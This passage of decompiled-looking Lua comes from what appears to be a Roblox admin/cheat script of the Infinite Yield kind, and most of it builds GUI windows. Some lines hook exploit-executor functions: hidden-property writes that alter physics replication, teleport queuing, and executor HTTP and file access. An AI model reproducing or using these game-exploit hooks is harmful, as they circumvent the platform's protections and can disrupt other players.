selectJoin.BorderSizePixel = 0
selectJoin.Position = UDim2.new(0, 169, 0, 5)
selectJoin.Size = UDim2.new(0, 164, 0, 20)
selectJoin.ZIndex = 10
selectJoin.Font = Enum.Font.SourceSans
selectJoin.FontSize = Enum.FontSize.Size14
selectJoin.Text = "Join Logs"
selectJoin.TextColor3 = Color3.new(1, 1, 1)
table.insert(shade3, selectJoin)
table.insert(text1, selectJoin)

create = function(arg)
	local tbl5 = {}

	for _, v in pairs(arg) do
		tbl5[v[1]] = Instance.new(v[2])
	end

	for _, v in pairs(arg) do
		for k, v2 in pairs(v[3]) do
			if type(v2) == "table" then
				tbl5[v[1]][k] = tbl5[v2[1]]
			else
				tbl5[v[1]][k] = v2
			end
		end
	end

	return tbl5[1]
end

do
	local TextService = game:GetService("TextService")

	local function fn2()
		local tbl5 = {
			__index = { Update = function(arg)
				local cursorPosition = arg.TextBox.CursorPosition
				local text = arg.TextBox.Text
				if text == "" then
					arg.TextBox.Position = UDim2.new(0, 2, 0, 0)
					return
				end

				if cursorPosition == -1 then
					return
				end
				local str = text:sub(1, cursorPosition - 1)
				local n = -arg.TextBox.Position.X.Offset
				local n2 = n + arg.View.AbsoluteSize.X
				local x = TextService:GetTextSize(text, arg.TextBox.TextSize, arg.TextBox.Font, Vector2.new(1000000000, 100)).X
				local x2 = TextService:GetTextSize(str, arg.TextBox.TextSize, arg.TextBox.Font, Vector2.new(1000000000, 100)).X
				local n3

				if x2 > n2 then
					n3 = math.max(-2, x2 - arg.View.AbsoluteSize.X + 2)
				elseif x2 < n then
					n3 = math.max(-2, x2 - 2)
				else
					n3 = nil

					if x < n2 then
						n3 = math.max(-2, x - arg.View.AbsoluteSize.X + 2)
					end
				end

				if n3 then
					arg.TextBox.Position = UDim2.new(0, -n3, 0, 0)
					arg.TextBox.Size = UDim2.new(1, n3, 1, 0)
				end
			end },
		}

		return { convert = function(arg)
			local obj = setmetatable({ OffsetX = 0, TextBox = arg }, tbl5)
			local frame2 = Instance.new("Frame")
			frame2.BackgroundTransparency = arg.BackgroundTransparency
			frame2.BackgroundColor3 = arg.BackgroundColor3
			frame2.BorderSizePixel = arg.BorderSizePixel
			frame2.BorderColor3 = arg.BorderColor3
			frame2.Position = arg.Position
			frame2.Size = arg.Size
			frame2.ClipsDescendants = true
			frame2.Name = arg.Name
			frame2.ZIndex = arg.ZIndex or 10
			arg.BackgroundTransparency = 1
			arg.Position = UDim2.new(0, 4, 0, 0)
			arg.Size = UDim2.new(1, -8, 1, 0)
			arg.TextXAlignment = Enum.TextXAlignment.Left
			arg.Name = "Input"
			arg.ZIndex = (frame2.ZIndex or 10) + 2
			arg.Active = true
			arg.TextEditable = true

			frame2.InputBegan:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
					arg:CaptureFocus()
				end
			end)

			table.insert(text1, arg)
			table.insert(shade2, frame2)
			obj.View = frame2

			arg.Changed:Connect(function(arg2)
				if arg2 == "Text" or arg2 == "CursorPosition" or arg2 == "AbsoluteSize" then
					obj:Update()
				end
			end)

			obj:Update()
			frame2.Parent = arg.Parent
			arg.Parent = frame2
			return obj
		end }
	end

	ViewportTextBox = fn2()
end

ViewportTextBox.convert(Cmdbar).View.ZIndex = 10
ViewportTextBox.convert(Cmdbar_2).View.ZIndex = 10
ViewportTextBox.convert(Cmdbar_3).View.ZIndex = 10
IYMouse = Players.LocalPlayer:GetMouse()
UserInputService = game:GetService("UserInputService")
TweenService = game:GetService("TweenService")
HttpService = game:GetService("HttpService")
MarketplaceService = game:GetService("MarketplaceService")
RunService = game:GetService("RunService")
TeleportService = game:GetService("TeleportService")
StarterGui = game:GetService("StarterGui")
GuiService = game:GetService("GuiService")
Lighting = game:GetService("Lighting")
ContextActionService = game:GetService("ContextActionService")
NetworkClient = game:GetService("NetworkClient")
ReplicatedStorage = game:GetService("ReplicatedStorage")
GroupService = game:GetService("GroupService")
PathService = game:GetService("PathfindingService")
SoundService = game:GetService("SoundService")
Teams = game:GetService("Teams")
StarterPlayer = game:GetService("StarterPlayer")
InsertService = game:GetService("InsertService")
ChatService = game:GetService("Chat")
ProximityPromptService = game:GetService("ProximityPromptService")
StatsService = game:GetService("Stats")
MaterialService = game:GetService("MaterialService")
sethidden = sethiddenproperty or set_hidden_property or set_hidden_prop
gethidden = gethiddenproperty or get_hidden_property or get_hidden_prop

do
	local _sethiddenproperty = newcclosure and (sethiddenproperty or set_hidden_property or set_hidden_prop)

	if _sethiddenproperty then
		_sethiddenproperty = newcclosure(sethiddenproperty or set_hidden_property or set_hidden_prop)
	end

	local _sethiddenproperty2

	if _sethiddenproperty then
		_sethiddenproperty2 = _sethiddenproperty
	else
		_sethiddenproperty2 = sethiddenproperty or set_hidden_property or set_hidden_prop
	end

	setPhysicsRep = function(arg, arg2)
		if not arg then
			return
		end
		local _sethiddenproperty3 = _sethiddenproperty2 or sethiddenproperty or set_hidden_property or set_hidden_prop
		if not _sethiddenproperty3 then
			return
		end
		pcall(_sethiddenproperty3, arg, "PhysicsRepRootRef", arg2 and InstanceHandle and InstanceHandle.new(arg2) or arg2)
	end
end

queueteleport = syn and syn.queue_on_teleport or queue_on_teleport or fluxus and fluxus.queue_on_teleport
httprequest = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request
local jobId = game.JobId
PlaceId = game.PlaceId
JobId = jobId

writefileExploit = function()
	if writefile then
		return true
	end
end

isNumber = function(arg)
	if tonumber(arg) ~= nil or arg == "inf" then
		return true
	end
end

getRoot = function(arg)
	return arg:FindFirstChild("HumanoidRootPart") or arg:FindFirstChild("Torso") or arg:FindFirstChild("UpperTorso")
end

tools = function(arg)
	if arg:FindFirstChildOfClass("Backpack"):FindFirstChildOfClass("Tool") or arg.Character:FindFirstChildOfClass("Tool") then
		return true
	end
end

r15 = function(arg)
	local character = arg.Character
	local r15_ = Enum.HumanoidRigType.R15
	if character:FindFirstChildOfClass("Humanoid").RigType == r15_ then
		return true
	end
end

toClipboard = function(arg)
	local _setclipboard = setclipboard or toclipboard or set_clipboard or Clipboard and Clipboard.set

	if _setclipboard then
		_setclipboard(arg)
		notify("Clipboard", "Copied to clipboard")
	else
		notify("Clipboard", "Your exploit doesn't have the ability to use the clipboard")
	end
end

getHierarchy = function(arg)
	local str, flag

	if string.find(arg.Name, " ") then
		str = "[\"" .. arg.Name .. "\"]"
		flag = false
	else
		str = arg.Name
		flag = true
	end

	local str2 = ""
	local str3 = ""
	local parent

	if arg.Parent ~= game then
		parent = arg

		repeat
			parent = parent.Parent
			str3 = parent.ClassName
		until parent.Parent == game
	else
		parent = arg
	end

	if arg.Parent ~= parent then
		while true do
			arg = arg.Parent

			if string.find(tostring(arg), " ") then
				if flag then
					str = "[\"" .. arg.Name .. "\"]." .. str
				else
					str = "[\"" .. arg.Name .. "\"]" .. str
				end

				flag = false
			else
				if flag then
					str = arg.Name .. "." .. str
				else
					str = arg.Name .. "" .. str
				end

				flag = true
			end

			if arg.Parent ~= parent then
				continue
			end
			break
		end
	elseif string.find(tostring(arg), " ") then
		str = "[\"" .. arg.Name .. "\"]"
		flag = false
	end

	if flag then
		return "game:GetService(\"" .. str3 .. "\")." .. str
	end
	return "game:GetService(\"" .. str3 .. "\")" .. str
end

AllWaypoints = {}
local flag = false

writefileCooldown = function(arg, arg2)
	task.spawn(function()
		if not flag then
			flag = true
			writefile(arg, arg2)
		else
			repeat
				wait()
			until flag == false

			writefileCooldown(arg, arg2)
		end

		wait(3)
		flag = false
	end)
end

dragGUI = function(arg)
	task.spawn(function()
		local flag2 = nil
		local v = nil
		local vector = Vector3.zero
		local position = nil

		local function fn2(arg2)
			local n = arg2.Position - vector
			local udim2 = UDim2.new(position.X.Scale, position.X.Offset + n.X, position.Y.Scale, position.Y.Offset + n.Y)
			TweenService:Create(arg, TweenInfo.new(0.2), { Position = udim2 }):Play()
		end

		arg.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				flag2 = true
				vector = input.Position
				position = arg.Position

				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						flag2 = false
					end
				end)
			end
		end)

		arg.InputChanged:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
				v = input
			end
		end)

		UserInputService.InputChanged:Connect(function(input)
			if input == v and flag2 then
				fn2(input)
			end
		end)
	end)
end

dragGUI(logs)
dragGUI(KeybindEditor)
dragGUI(PluginEditor)
dragGUI(PluginsFrame)
dragGUI(ToPartFrame)

local function getHwid2()
	local tbl5 = {}

	local function fn2(arg, arg2)
		tbl5[arg] = { commands = {}, sets = arg2 or {} }
	end

	local v = nil

	local function fn3(arg, ...)
		local tbl6 = { ... }
		local v2 = tbl5[arg]

		if v2 then
			for _, command in pairs(v2.commands) do
				local flag2 = true

				for k, set in pairs(v2.sets) do
					local v3 = tbl6[k]
					local v4 = command[2][k]
					local type_ = set.Type

					if type_ == "Player" then
						if v4 == 0 then
							flag2 = flag2 and tostring(Players.LocalPlayer) == v3
						elseif v4 ~= 1 then
							flag2 = flag2 and table.find(getPlayer(v4, Players.LocalPlayer), v3)
						end
					elseif type_ == "String" then
						if v4 ~= 0 then
							if flag2 then
								local lower = v4.lower
								flag2 = string.find(v3:lower(), lower(v4))
							end
						end
					elseif type_ == "Number" then
						if v4 ~= 0 then
							flag2 = flag2 and tonumber(v3) <= tonumber(v4)
						end
					end

					if flag2 then
						continue
					end
					break
				end

				if flag2 then
					pcall(task.spawn(function()
						local str = command[1]

						for k, v3 in pairs(tbl6) do
							str = str:gsub("%$" .. k, v3)
						end

						wait(command[3] or 0)
						execCmd(str)
					end))
				end
			end
		end
	end

	local _create = create
	local tbl6 = {}
	local tbl7 = {}

	local tbl8 = {
		BackgroundColor3 = Color3.new(0.14117647707462, 0.14117647707462, 0.14509804546833),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		Name = "EventEditor",
		Position = UDim2.new(0.5, -175, 0, -500),
		Size = UDim2.new(0, 350, 0, 20),
		ZIndex = 10,
	}

	tbl7[1] = 1
	tbl7[2] = "Frame"
	tbl7[3] = tbl8
	local tbl9 = {}

	local tbl10 = {
		BackgroundColor3 = currentShade2,
		BorderSizePixel = 0,
		Name = "TopBar",
		Parent = { 1 },
		Size = UDim2.new(1, 0, 0, 20),
		ZIndex = 10,
	}

	tbl9[1] = 2
	tbl9[2] = "Frame"
	tbl9[3] = tbl10
	local tbl11 = {}

	local tbl12 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Font = 3,
		Name = "Title",
		Parent = { 2 },
		Position = UDim2.new(0, 0, 0, 0),
		Size = UDim2.new(1, 0, 0.95, 0),
		Text = "Event Editor",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextXAlignment = Enum.TextXAlignment.Center,
		ZIndex = 10,
	}

	tbl11[1] = 3
	tbl11[2] = "TextLabel"
	tbl11[3] = tbl12
	local tbl13 = {}

	local tbl14 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Font = 3,
		Name = "Close",
		Parent = { 2 },
		Position = UDim2.new(1, -20, 0, 0),
		Size = UDim2.new(0, 20, 0, 20),
		Text = "",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		ZIndex = 10,
	}

	tbl13[1] = 4
	tbl13[2] = "TextButton"
	tbl13[3] = tbl14
	local tbl15 = {}

	local tbl16 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Image = "rbxassetid://5054663650",
		Parent = { 4 },
		Position = UDim2.new(0, 5, 0, 5),
		Size = UDim2.new(0, 10, 0, 10),
		ZIndex = 10,
	}

	tbl15[1] = 5
	tbl15[2] = "ImageLabel"
	tbl15[3] = tbl16
	local tbl17 = {}

	local tbl18 = {
		BackgroundColor3 = currentShade1,
		BorderSizePixel = 0,
		Name = "Content",
		Parent = { 1 },
		Position = UDim2.new(0, 0, 0, 20),
		Size = UDim2.new(1, 0, 0, 202),
		ZIndex = 10,
	}

	tbl17[1] = 6
	tbl17[2] = "Frame"
	tbl17[3] = tbl18
	local tbl19 = {}

	local tbl20 = {
		BackgroundColor3 = Color3.new(0.14117647707462, 0.14117647707462, 0.14509804546833),
		BackgroundTransparency = 1,
		BorderColor3 = Color3.new(0.15686275064945, 0.15686275064945, 0.15686275064945),
		BorderSizePixel = 0,
		BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png",
		CanvasSize = UDim2.new(0, 0, 0, 100),
		Name = "List",
		Parent = { 6 },
		Position = UDim2.new(0, 5, 0, 5),
		ScrollBarImageColor3 = Color3.new(0.30588236451149, 0.30588236451149, 0.3098039329052),
		ScrollBarThickness = 8,
		Size = UDim2.new(1, -10, 1, -10),
		TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png",
		ZIndex = 10,
	}

	tbl19[1] = 7
	tbl19[2] = "ScrollingFrame"
	tbl19[3] = tbl20
	local tbl21 = {}

	local tbl22 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Name = "Holder",
		Parent = { 7 },
		Size = UDim2.new(1, 0, 1, 0),
		ZIndex = 10,
	}

	tbl21[1] = 8
	tbl21[2] = "Frame"
	tbl21[3] = tbl22
	local tbl23 = {}

	local tbl24 = {
		BackgroundColor3 = Color3.new(0.14117647707462, 0.14117647707462, 0.14509804546833),
		BackgroundTransparency = 1,
		BorderColor3 = Color3.new(0.3137255012989, 0.3137255012989, 0.3137255012989),
		BorderSizePixel = 0,
		ClipsDescendants = true,
		Name = "Settings",
		Parent = { 6 },
		Position = UDim2.new(1, 0, 0, 0),
		Size = UDim2.new(0, 150, 1, 0),
		ZIndex = 10,
	}

	tbl23[1] = 10
	tbl23[2] = "Frame"
	tbl23[3] = tbl24
	local tbl25 = {}

	local tbl26 = {
		BackgroundColor3 = Color3.new(0.14117647707462, 0.14117647707462, 0.14509804546833),
		Name = "Slider",
		Parent = { 10 },
		Position = UDim2.new(0, -150, 0, 0),
		Size = UDim2.new(1, 0, 1, 0),
		ZIndex = 10,
	}

	tbl25[1] = 11
	tbl25[2] = "Frame"
	tbl25[3] = tbl26
	local tbl27 = {}

	local tbl28 = {
		BackgroundColor3 = Color3.new(0.23529413342476, 0.23529413342476, 0.23529413342476),
		BorderColor3 = Color3.new(0.3137255012989, 0.3137255012989, 0.3137255012989),
		BorderSizePixel = 0,
		Name = "Line",
		Parent = { 11 },
		Size = UDim2.new(0, 1, 1, 0),
		ZIndex = 10,
	}

	tbl27[1] = 12
	tbl27[2] = "Frame"
	tbl27[3] = tbl28
	local tbl29 = {}

	local tbl30 = {
		BackgroundColor3 = Color3.new(0.14117647707462, 0.14117647707462, 0.14509804546833),
		BackgroundTransparency = 1,
		BorderColor3 = Color3.new(0.15686275064945, 0.15686275064945, 0.15686275064945),
		BorderSizePixel = 0,
		BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png",
		CanvasSize = UDim2.new(0, 0, 0, 100),
		Name = "List",
		Parent = { 11 },
		Position = UDim2.new(0, 0, 0, 25),
		ScrollBarImageColor3 = Color3.new(0.30588236451149, 0.30588236451149, 0.3098039329052),
		ScrollBarThickness = 8,
		Size = UDim2.new(1, 0, 1, -25),
		TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png",
		ZIndex = 10,
	}

	tbl29[1] = 13
	tbl29[2] = "ScrollingFrame"
	tbl29[3] = tbl30
	local tbl31 = {}

	local tbl32 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Name = "Holder",
		Parent = { 13 },
		Size = UDim2.new(1, 0, 1, 0),
		ZIndex = 10,
	}

	tbl31[1] = 14
	tbl31[2] = "Frame"
	tbl31[3] = tbl32
	local tbl33 = {}

	local tbl34 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Font = 3,
		Name = "Title",
		Parent = { 11 },
		Size = UDim2.new(1, 0, 0, 20),
		Text = "Event Settings",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		ZIndex = 10,
	}

	tbl33[1] = 16
	tbl33[2] = "TextLabel"
	tbl33[3] = tbl34
	local tbl35 = {}

	local tbl36 = {
		BackgroundColor3 = Color3.new(0.14117647707462, 0.14117647707462, 0.14509804546833),
		BorderColor3 = Color3.new(0.15686275064945, 0.15686275064945, 0.15686275064945),
		Font = 3,
		Name = "Close",
		BorderSizePixel = 0,
		Parent = { 11 },
		Position = UDim2.new(1, -20, 0, 0),
		Size = UDim2.new(0, 20, 0, 20),
		Text = "<",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 18,
		ZIndex = 10,
	}

	tbl35[1] = 17
	tbl35[2] = "TextButton"
	tbl35[3] = tbl36
	local tbl37 = {}

	local tbl38 = {
		BackgroundColor3 = Color3.new(0.19607844948769, 0.19607844948769, 0.19607844948769),
		BackgroundTransparency = 1,
		BorderColor3 = Color3.new(0.15686275064945, 0.15686275064945, 0.15686275064945),
		Name = "Players",
		Parent = { 18 },
		Position = UDim2.new(0, 0, 0, 25),
		Size = UDim2.new(1, 0, 0, 86),
		Visible = false,
		ZIndex = 10,
	}

	tbl37[1] = 19
	tbl37[2] = "Frame"
	tbl37[3] = tbl38
	local tbl39 = {}

	local tbl40 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Font = 3,
		Name = "Title",
		Parent = { 19 },
		Size = UDim2.new(1, 0, 0, 20),
		Text = "Choose Players",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		ZIndex = 10,
	}

	tbl39[1] = 20
	tbl39[2] = "TextLabel"
	tbl39[3] = tbl40
	local tbl41 = {}

	local tbl42 = {
		BackgroundColor3 = Color3.new(0.1803921610117, 0.1803921610117, 0.1843137294054),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		Font = 3,
		Name = "Any",
		Parent = { 19 },
		Position = UDim2.new(0, 5, 0, 42),
		Size = UDim2.new(1, -10, 0, 20),
		Text = "Any Player",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl41[1] = 21
	tbl41[2] = "TextLabel"
	tbl41[3] = tbl42
	local tbl43 = {}

	local tbl44 = {
		BackgroundColor3 = Color3.new(0.30588236451149, 0.30588236451149, 0.3098039329052),
		BorderSizePixel = 0,
		Name = "Button",
		Parent = { 21 },
		Position = UDim2.new(1, -20, 0, 0),
		Size = UDim2.new(0, 20, 0, 20),
		ZIndex = 10,
	}

	tbl43[1] = 22
	tbl43[2] = "Frame"
	tbl43[3] = tbl44
	local tbl45 = {}

	local tbl46 = {
		BackgroundColor3 = Color3.new(0.58823531866074, 0.58823531866074, 0.59215688705444),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		Font = 3,
		Name = "On",
		Parent = { 22 },
		Position = UDim2.new(0, 2, 0, 2),
		Size = UDim2.new(0, 16, 0, 16),
		Text = "",
		TextColor3 = Color3.new(0, 0, 0),
		TextSize = 14,
		ZIndex = 10,
	}

	tbl45[1] = 23
	tbl45[2] = "TextButton"
	tbl45[3] = tbl46
	local tbl47 = {}

	local tbl48 = {
		BackgroundColor3 = Color3.new(0.1803921610117, 0.1803921610117, 0.1843137294054),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		Font = 3,
		Name = "Me",
		Parent = { 19 },
		Position = UDim2.new(0, 5, 0, 20),
		Size = UDim2.new(1, -10, 0, 20),
		Text = "Me Only",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl47[1] = 24
	tbl47[2] = "TextLabel"
	tbl47[3] = tbl48
	local tbl49 = {}

	local tbl50 = {
		BackgroundColor3 = Color3.new(0.30588236451149, 0.30588236451149, 0.3098039329052),
		BorderSizePixel = 0,
		Name = "Button",
		Parent = { 24 },
		Position = UDim2.new(1, -20, 0, 0),
		Size = UDim2.new(0, 20, 0, 20),
		ZIndex = 10,
	}

	tbl49[1] = 25
	tbl49[2] = "Frame"
	tbl49[3] = tbl50
	local tbl51 = {}

	local tbl52 = {
		BackgroundColor3 = Color3.new(0.58823531866074, 0.58823531866074, 0.59215688705444),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		Font = 3,
		Name = "On",
		Parent = { 25 },
		Position = UDim2.new(0, 2, 0, 2),
		Size = UDim2.new(0, 16, 0, 16),
		Text = "",
		TextColor3 = Color3.new(0, 0, 0),
		TextSize = 14,
		ZIndex = 10,
	}

	tbl51[1] = 26
	tbl51[2] = "TextButton"
	tbl51[3] = tbl52
	local tbl53 = {}

	local tbl54 = {
		BackgroundColor3 = Color3.new(0.1803921610117, 0.1803921610117, 0.1843137294054),
		BorderColor3 = Color3.new(0.15686275064945, 0.15686275064945, 0.15686275064945),
		BorderSizePixel = 0,
		ClearTextOnFocus = false,
		Font = 3,
		Name = "Custom",
		Parent = { 19 },
		PlaceholderColor3 = Color3.new(0.47058826684952, 0.47058826684952, 0.47058826684952),
		PlaceholderText = "Custom Player Set",
		Position = UDim2.new(0, 5, 0, 64),
		Size = UDim2.new(1, -35, 0, 20),
		Text = "",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl53[1] = 27
	tbl53[2] = "TextBox"
	tbl53[3] = tbl54
	local tbl55 = {}

	local tbl56 = {
		BackgroundColor3 = Color3.new(0.30588236451149, 0.30588236451149, 0.3098039329052),
		BorderSizePixel = 0,
		Name = "CustomButton",
		Parent = { 19 },
		Position = UDim2.new(1, -25, 0, 64),
		Size = UDim2.new(0, 20, 0, 20),
		ZIndex = 10,
	}

	tbl55[1] = 28
	tbl55[2] = "Frame"
	tbl55[3] = tbl56
	local tbl57 = {}

	local tbl58 = {
		BackgroundColor3 = Color3.new(0.58823531866074, 0.58823531866074, 0.59215688705444),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		Font = 3,
		Name = "On",
		Parent = { 28 },
		Position = UDim2.new(0, 2, 0, 2),
		Size = UDim2.new(0, 16, 0, 16),
		Text = "",
		TextColor3 = Color3.new(0, 0, 0),
		TextSize = 14,
		ZIndex = 10,
	}

	tbl57[1] = 29
	tbl57[2] = "TextButton"
	tbl57[3] = tbl58
	local tbl59 = {}

	local tbl60 = {
		BackgroundColor3 = Color3.new(0.19607844948769, 0.19607844948769, 0.19607844948769),
		BackgroundTransparency = 1,
		BorderColor3 = Color3.new(0.15686275064945, 0.15686275064945, 0.15686275064945),
		Name = "Strings",
		Parent = { 18 },
		Position = UDim2.new(0, 0, 0, 25),
		Size = UDim2.new(1, 0, 0, 64),
		Visible = false,
		ZIndex = 10,
	}

	tbl59[1] = 30
	tbl59[2] = "Frame"
	tbl59[3] = tbl60
	local tbl61 = {}

	local tbl62 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Font = 3,
		Name = "Title",
		Parent = { 30 },
		Size = UDim2.new(1, 0, 0, 20),
		Text = "Choose String",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		ZIndex = 10,
	}

	tbl61[1] = 31
	tbl61[2] = "TextLabel"
	tbl61[3] = tbl62
	local tbl63 = {}

	local tbl64 = {
		BackgroundColor3 = Color3.new(0.1803921610117, 0.1803921610117, 0.1843137294054),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		Font = 3,
		Name = "Any",
		Parent = { 30 },
		Position = UDim2.new(0, 5, 0, 20),
		Size = UDim2.new(1, -10, 0, 20),
		Text = "Any String",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl63[1] = 32
	tbl63[2] = "TextLabel"
	tbl63[3] = tbl64
	local tbl65 = {}

	local tbl66 = {
		BackgroundColor3 = Color3.new(0.30588236451149, 0.30588236451149, 0.3098039329052),
		BorderSizePixel = 0,
		Name = "Button",
		Parent = { 32 },
		Position = UDim2.new(1, -20, 0, 0),
		Size = UDim2.new(0, 20, 0, 20),
		ZIndex = 10,
	}

	tbl65[1] = 33
	tbl65[2] = "Frame"
	tbl65[3] = tbl66
	local tbl67 = {}

	local tbl68 = {
		BackgroundColor3 = Color3.new(0.58823531866074, 0.58823531866074, 0.59215688705444),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		Font = 3,
		Name = "On",
		Parent = { 33 },
		Position = UDim2.new(0, 2, 0, 2),
		Size = UDim2.new(0, 16, 0, 16),
		Text = "",
		TextColor3 = Color3.new(0, 0, 0),
		TextSize = 14,
		ZIndex = 10,
	}

	tbl67[1] = 34
	tbl67[2] = "TextButton"
	tbl67[3] = tbl68
	local tbl69 = {}

	local tbl70 = {
		BackgroundColor3 = Color3.new(0.19607844948769, 0.19607844948769, 0.19607844948769),
		BackgroundTransparency = 1,
		BorderColor3 = Color3.new(0.15686275064945, 0.15686275064945, 0.15686275064945),
		Name = "Numbers",
		Parent = { 18 },
		Position = UDim2.new(0, 0, 0, 25),
		Size = UDim2.new(1, 0, 0, 64),
		Visible = false,
		ZIndex = 10,
	}

	tbl69[1] = 54
	tbl69[2] = "Frame"
	tbl69[3] = tbl70
	local tbl71 = {}

	local tbl72 = {
		BackgroundColor3 = Color3.new(1, 1, 1),
		BackgroundTransparency = 1,
		Font = 3,
		Name = "Title",
		Parent = { 54 },
		Size = UDim2.new(1, 0, 0, 20),
		Text = "Choose String",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		ZIndex = 10,
	}

	tbl71[1] = 55
	tbl71[2] = "TextLabel"
	tbl71[3] = tbl72
	local tbl73 = {}

	local tbl74 = {
		BackgroundColor3 = Color3.new(0.1803921610117, 0.1803921610117, 0.1843137294054),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		Font = 3,
		Name = "Any",
		Parent = { 54 },
		Position = UDim2.new(0, 5, 0, 20),
		Size = UDim2.new(1, -10, 0, 20),
		Text = "Any Number",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl73[1] = 56
	tbl73[2] = "TextLabel"
	tbl73[3] = tbl74
	local tbl75 = {}

	local tbl76 = {
		BackgroundColor3 = Color3.new(0.30588236451149, 0.30588236451149, 0.3098039329052),
		BorderSizePixel = 0,
		Name = "Button",
		Parent = { 56 },
		Position = UDim2.new(1, -20, 0, 0),
		Size = UDim2.new(0, 20, 0, 20),
		ZIndex = 10,
	}

	tbl75[1] = 57
	tbl75[2] = "Frame"
	tbl75[3] = tbl76
	local tbl77 = {}

	local tbl78 = {
		BackgroundColor3 = Color3.new(0.58823531866074, 0.58823531866074, 0.59215688705444),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		Font = 3,
		Name = "On",
		Parent = { 57 },
		Position = UDim2.new(0, 2, 0, 2),
		Size = UDim2.new(0, 16, 0, 16),
		Text = "",
		TextColor3 = Color3.new(0, 0, 0),
		TextSize = 14,
		ZIndex = 10,
	}

	tbl77[1] = 58
	tbl77[2] = "TextButton"
	tbl77[3] = tbl78
	local tbl79 = {}

	local tbl80 = {
		BackgroundColor3 = Color3.new(0.1803921610117, 0.1803921610117, 0.1843137294054),
		BorderColor3 = Color3.new(0.15686275064945, 0.15686275064945, 0.15686275064945),
		BorderSizePixel = 0,
		ClearTextOnFocus = false,
		Font = 3,
		Name = "Custom",
		Parent = { 54 },
		PlaceholderColor3 = Color3.new(0.47058826684952, 0.47058826684952, 0.47058826684952),
		PlaceholderText = "Number",
		Position = UDim2.new(0, 5, 0, 42),
		Size = UDim2.new(1, -35, 0, 20),
		Text = "",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl79[1] = 59
	tbl79[2] = "TextBox"
	tbl79[3] = tbl80
	local tbl81 = {}

	local tbl82 = {
		BackgroundColor3 = Color3.new(0.30588236451149, 0.30588236451149, 0.3098039329052),
		BorderSizePixel = 0,
		Name = "CustomButton",
		Parent = { 54 },
		Position = UDim2.new(1, -25, 0, 42),
		Size = UDim2.new(0, 20, 0, 20),
		ZIndex = 10,
	}

	tbl81[1] = 60
	tbl81[2] = "Frame"
	tbl81[3] = tbl82
	local tbl83 = {}

	local tbl84 = {
		BackgroundColor3 = Color3.new(0.58823531866074, 0.58823531866074, 0.59215688705444),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		Font = 3,
		Name = "On",
		Parent = { 60 },
		Position = UDim2.new(0, 2, 0, 2),
		Size = UDim2.new(0, 16, 0, 16),
		Text = "",
		TextColor3 = Color3.new(0, 0, 0),
		TextSize = 14,
		ZIndex = 10,
	}

	tbl83[1] = 61
	tbl83[2] = "TextButton"
	tbl83[3] = tbl84
	local tbl85 = {}

	local tbl86 = {
		BackgroundColor3 = Color3.new(0.1803921610117, 0.1803921610117, 0.1843137294054),
		BorderColor3 = Color3.new(0.15686275064945, 0.15686275064945, 0.15686275064945),
		BorderSizePixel = 0,
		ClearTextOnFocus = false,
		Font = 3,
		Name = "Custom",
		Parent = { 30 },
		PlaceholderColor3 = Color3.new(0.47058826684952, 0.47058826684952, 0.47058826684952),
		PlaceholderText = "Match String",
		Position = UDim2.new(0, 5, 0, 42),
		Size = UDim2.new(1, -35, 0, 20),
		Text = "",
		TextColor3 = Color3.new(1, 1, 1),
		TextSize = 14,
		TextXAlignment = 0,
		ZIndex = 10,
	}

	tbl85[1] = 35
	tbl85[2] = "TextBox"
	tbl85[3] = tbl86
	local tbl87 = {}

	local tbl88 = {
